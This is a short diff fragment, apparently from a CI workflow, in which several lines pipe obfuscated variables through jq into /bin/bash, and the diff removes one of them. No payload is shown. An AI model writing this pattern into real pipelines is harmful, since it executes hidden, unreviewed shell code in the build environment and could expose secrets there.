@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$nam6" | jq -r .ewr98 | /bin/bash
           echo $anhn284 | jq -r .utpvf248 | /bin/bash
           echo $szodh55634 | jq -r .svu0111 | /bin/bash
-          printf '%s' "$qxqjo6391" | jq -r .d6 | /bin/bash
           echo $kougw2640 | jq -r .mfq43 | /bin/bash
           echo $df60 | jq -r .qjkke3 | /bin/bash
 
